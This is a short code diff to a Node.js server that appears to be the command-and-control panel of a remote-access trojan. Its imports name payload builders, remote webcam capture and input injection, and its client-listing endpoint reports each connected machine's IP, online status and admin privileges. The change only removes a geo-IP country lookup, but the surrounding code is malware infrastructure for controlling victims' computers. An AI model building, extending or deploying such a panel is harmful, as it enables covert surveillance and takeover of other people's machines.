@@ -17,7 +17,6 @@ import { startUdp, closeUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMo
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
 import { buildJavaPayload } from './builder/java_build.js';
-import { countriesFor } from './builder/geo.js';
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC_DIR = path.join(__dirname, 'public');
@@ -452,9 +451,6 @@ app.get('/api/clients', requireAuth, async (req, res) => {
   const offlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen < ?`)
     .get(req.user.uid, cutoff);
 
-  let geo = {};
-  try { geo = await countriesFor(rows.map(r => r.ip)); } catch {}
-
   res.json({
     total:   Number(totalRow.n),
     online:  Number(onlineRow.n),
@@ -465,7 +461,7 @@ app.get('/api/clients', requireAuth, async (req, res) => {
       ip: r.ip,
       online: now - r.last_seen < 30_000,
       lastSeen: r.last_seen,
-      country: geo[r.ip] || null,
+      country: null, // Geo lookup removed
       privileges: 'admin',
       ping: getPing(r.id),
     })),
